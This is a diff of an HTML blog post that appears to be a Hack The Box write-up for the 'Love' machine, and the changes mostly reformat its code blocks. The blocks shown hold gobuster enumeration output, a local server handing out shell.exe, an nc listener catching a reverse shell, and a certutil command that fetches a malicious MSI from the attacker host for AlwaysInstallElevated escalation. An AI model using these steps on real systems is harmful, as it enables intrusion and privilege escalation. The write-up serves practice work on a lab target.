@@ -152,152 +152,152 @@ Service detection performed. Please report any incorrect results at https://nmap
 
         <p>In addition to that, I ran a gobuster scan against the main web page at port 80:</p>
         <pre><code class="language-yaml">===============================================================
-            Gobuster v3.1.0
-            by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-            ===============================================================
-            [+] Url:                     http://10.10.10.239
-            [+] Method:                  GET
-            [+] Threads:                 100
-            [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-            [+] Negative Status codes:   404
-            [+] User Agent:              gobuster/3.1.0
-            [+] Timeout:                 10s
-            ===============================================================
-            2021/07/09 06:01:06 Starting gobuster in directory enumeration mode
-            ===============================================================
-            
-            /images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
-            
-            /Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
-            
-            /admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/] 
-            
-            /plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
-            
-            /includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
-            
-            /dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]    
-            
-            /licenses             (Status: 403) [Size: 421]                                    
-            
-            /examples             (Status: 503) [Size: 402]                                    
-            
-            /IMAGES               (Status: 301) [Size: 338] [--> http://10.10.10.239/IMAGES/]  
-            
-            /%20                  (Status: 403) [Size: 302]                                    
-            
-            /Admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/Admin/]   
-            
-            /*checkout*           (Status: 403) [Size: 302]                                    
-            
-            /Plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/Plugins/] 
-            
-            /phpmyadmin           (Status: 403) [Size: 302]                                    
-            
-            /webalizer            (Status: 403) [Size: 302]                                    
-            
-            /*docroot*            (Status: 403) [Size: 302]                                    
-            
-            /*                    (Status: 403) [Size: 302]                                    
-            
-            /con                  (Status: 403) [Size: 302]                                    
-            
-            /http%3A              (Status: 403) [Size: 302]                                    
-            
-            /Includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/Includes/]
-            
-            /**http%3a            (Status: 403) [Size: 302]                                    
-            
-            /*http%3A             (Status: 403) [Size: 302]                                    
-            
-            /aux                  (Status: 403) [Size: 302]                                    
-            
-            /Dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/Dist/]    
-            
-            /**http%3A            (Status: 403) [Size: 302]                                    
-            
-            /%C0                  (Status: 403) [Size: 302]                                    
-            
-            /server-status        (Status: 403) [Size: 421]                                    
-            
-            /%3FRID%3D2671        (Status: 403) [Size: 302]                                    
-            
-            /devinmoore*          (Status: 403) [Size: 302]                                    
-            
-            /200109*              (Status: 403) [Size: 302]                                    
-            
-            /*sa_                 (Status: 403) [Size: 302]                                    
-            
-            /*dc_                 (Status: 403) [Size: 302]                                    
-            
-            /%D8                  (Status: 403) [Size: 302]                                    
-            
-            /%CE                  (Status: 403) [Size: 302]                                    
-            
-            /%CF                  (Status: 403) [Size: 302]                                    
-            
-            /%CD                  (Status: 403) [Size: 302]                                    
-            
-            /%CC                  (Status: 403) [Size: 302]                                    
-            
-            /%CA                  (Status: 403) [Size: 302]                                    
-            
-            /%CB                  (Status: 403) [Size: 302]                                    
-            
-            /%D6                  (Status: 403) [Size: 302]                                    
-            
-            /%D0                  (Status: 403) [Size: 302]                                    
-            
-            /%D1                  (Status: 403) [Size: 302]                                    
-            
-            /%D4                  (Status: 403) [Size: 302]                                    
-            
-            /%D3                  (Status: 403) [Size: 302]                                    
-            
-            /%D7                  (Status: 403) [Size: 302]                                    
-            
-            /%D5                  (Status: 403) [Size: 302]                                    
-            
-            /%D2                  (Status: 403) [Size: 302]                                    
-            
-            /%C9                  (Status: 403) [Size: 302]                                    
-            
-            /%C1                  (Status: 403) [Size: 302]                                    
-            
-            /%C8                  (Status: 403) [Size: 302]                                    
-            
-            /%C6                  (Status: 403) [Size: 302]                                    
-            
-            /%C3                  (Status: 403) [Size: 302]                                    
-            
-            /%C5                  (Status: 403) [Size: 302]                                    
-            
-            /%C7                  (Status: 403) [Size: 302]                                    
-            
-            /%C2                  (Status: 403) [Size: 302]                                    
-            
-            /%C4                  (Status: 403) [Size: 302]                                    
-            
-            /%D9                  (Status: 403) [Size: 302]                                    
-            
-            /%DD                  (Status: 403) [Size: 302]                                    
-            
-            /%DF                  (Status: 403) [Size: 302]                                    
-            
-            /%DE                  (Status: 403) [Size: 302]                                    
-            
-            /%DB                  (Status: 403) [Size: 302]                                    
-            
-            /login%3f             (Status: 403) [Size: 302]                                    
-            
-            /%22julie%20roehm%22  (Status: 403) [Size: 302]                                    
-            
-            /%22james%20kim%22    (Status: 403) [Size: 302]                                    
-            
-            /%22britney%20spears%22 (Status: 403) [Size: 302]                                  
-            ===============================================================
-            2021/07/09 06:05:24 Finished
-            ===============================================================</code></pre>
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.239
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/07/09 06:01:06 Starting gobuster in directory enumeration mode
+===============================================================
+
+/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
+
+/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
+
+/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/] 
+
+/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
+
+/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
+
+/dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]    
+
+/licenses             (Status: 403) [Size: 421]                                    
+
+/examples             (Status: 503) [Size: 402]                                    
+
+/IMAGES               (Status: 301) [Size: 338] [--> http://10.10.10.239/IMAGES/]  
+
+/%20                  (Status: 403) [Size: 302]                                    
+
+/Admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/Admin/]   
+
+/*checkout*           (Status: 403) [Size: 302]                                    
+
+/Plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/Plugins/] 
+
+/phpmyadmin           (Status: 403) [Size: 302]                                    
+
+/webalizer            (Status: 403) [Size: 302]                                    
+
+/*docroot*            (Status: 403) [Size: 302]                                    
+
+/*                    (Status: 403) [Size: 302]                                    
+
+/con                  (Status: 403) [Size: 302]                                    
+
+/http%3A              (Status: 403) [Size: 302]                                    
+
+/Includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/Includes/]
+
+/**http%3a            (Status: 403) [Size: 302]                                    
+
+/*http%3A             (Status: 403) [Size: 302]                                    
+
+/aux                  (Status: 403) [Size: 302]                                    
+
+/Dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/Dist/]    
+
+/**http%3A            (Status: 403) [Size: 302]                                    
+
+/%C0                  (Status: 403) [Size: 302]                                    
+
+/server-status        (Status: 403) [Size: 421]                                    
+
+/%3FRID%3D2671        (Status: 403) [Size: 302]                                    
+
+/devinmoore*          (Status: 403) [Size: 302]                                    
+
+/200109*              (Status: 403) [Size: 302]                                    
+
+/*sa_                 (Status: 403) [Size: 302]                                    
+
+/*dc_                 (Status: 403) [Size: 302]                                    
+
+/%D8                  (Status: 403) [Size: 302]                                    
+
+/%CE                  (Status: 403) [Size: 302]                                    
+
+/%CF                  (Status: 403) [Size: 302]                                    
+
+/%CD                  (Status: 403) [Size: 302]                                    
+
+/%CC                  (Status: 403) [Size: 302]                                    
+
+/%CA                  (Status: 403) [Size: 302]                                    
+
+/%CB                  (Status: 403) [Size: 302]                                    
+
+/%D6                  (Status: 403) [Size: 302]                                    
+
+/%D0                  (Status: 403) [Size: 302]                                    
+
+/%D1                  (Status: 403) [Size: 302]                                    
+
+/%D4                  (Status: 403) [Size: 302]                                    
+
+/%D3                  (Status: 403) [Size: 302]                                    
+
+/%D7                  (Status: 403) [Size: 302]                                    
+
+/%D5                  (Status: 403) [Size: 302]                                    
+
+/%D2                  (Status: 403) [Size: 302]                                    
+
+/%C9                  (Status: 403) [Size: 302]                                    
+
+/%C1                  (Status: 403) [Size: 302]                                    
+
+/%C8                  (Status: 403) [Size: 302]                                    
+
+/%C6                  (Status: 403) [Size: 302]                                    
+
+/%C3                  (Status: 403) [Size: 302]                                    
+
+/%C5                  (Status: 403) [Size: 302]                                    
+
+/%C7                  (Status: 403) [Size: 302]                                    
+
+/%C2                  (Status: 403) [Size: 302]                                    
+
+/%C4                  (Status: 403) [Size: 302]                                    
+
+/%D9                  (Status: 403) [Size: 302]                                    
+
+/%DD                  (Status: 403) [Size: 302]                                    
+
+/%DF                  (Status: 403) [Size: 302]                                    
+
+/%DE                  (Status: 403) [Size: 302]                                    
+
+/%DB                  (Status: 403) [Size: 302]                                    
+
+/login%3f             (Status: 403) [Size: 302]                                    
+
+/%22julie%20roehm%22  (Status: 403) [Size: 302]                                    
+
+/%22james%20kim%22    (Status: 403) [Size: 302]                                    
+
+/%22britney%20spears%22 (Status: 403) [Size: 302]                                  
+===============================================================
+2021/07/09 06:05:24 Finished
+===============================================================</code></pre>
 
         <p>Most of the open ports and services identified in the scan led to nothing useful, however one particular thing stood out. A subdomain, <code>staging.love.htb</code>, was specifically listed in the SSL certificate on port 443. Given that visiting the normal site generates a 403 error both when using <code>https://10.10.10.239</code> and <code>https://love.htb</code>, I decided to add <code>staging.love.htb</code> to the <code>/etc/hosts</code> file and enumerate that. Worth noting that you have to visit the website on port 80 via HTTP, not 443 via HTTPS.</p>
         <img src="../img/posts/love/0.png" />
@@ -373,15 +373,13 @@ Directory of C:\xampp\htdocs\omrs\images
 08/07/2021  12:04 PM                32 test.php
              10 File(s)      2,128,366 bytes
               2 Dir(s)   3,880,849,408 bytes free
-.\shell.exe
-</code></pre>
+.\shell.exe</code></pre>
         <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
 └─$ sudo python3 -m http.server 80
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
-10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
-    </code></pre>
+10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -</code></pre>
 <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
 └─$ sudo nc -nvlp 4445 
 [sudo] password for kali: 
@@ -389,13 +387,12 @@ listening on [any] 4445 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
 Microsoft Windows [Version 10.0.19042.867]
 (c) 2020 Microsoft Corporation. All rights reserved.
-
+ 
 C:\xampp\htdocs\omrs\images>whoami
-whoami
-love\phoebe
+whoami   
+love\phoebe 
 
-C:\xampp\htdocs\omrs\images>
-    </code></pre>
+C:\xampp\htdocs\omrs\images&gt;</code></pre>
 
         <p>From there, I was able to grab the user flag, download winPEAS from my machine, and run it. Within its output I found my path to root - the <code>AlwaysInstallElevated</code> privilege. This allows any user, regardless of what privileges they normally have, to install software as an administrator. This is a dangerous configuration, as the <code>.msi</code> files used to install programs can also provide commands to run during installation, which in this case would be run as a system-level user.</p>
         <img src="../img/posts/love/13.png" />
@@ -425,9 +422,10 @@ connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
 Microsoft Windows [Version 10.0.19042.867]
 (c) 2020 Microsoft Corporation. All rights reserved.
 
+
 C:\xampp\htdocs\omrs\images>whoami
-whoami
-love\phoebe
+whoami   
+love\phoebe    
 
 C:\xampp\htdocs\omrs\images>certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
 certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
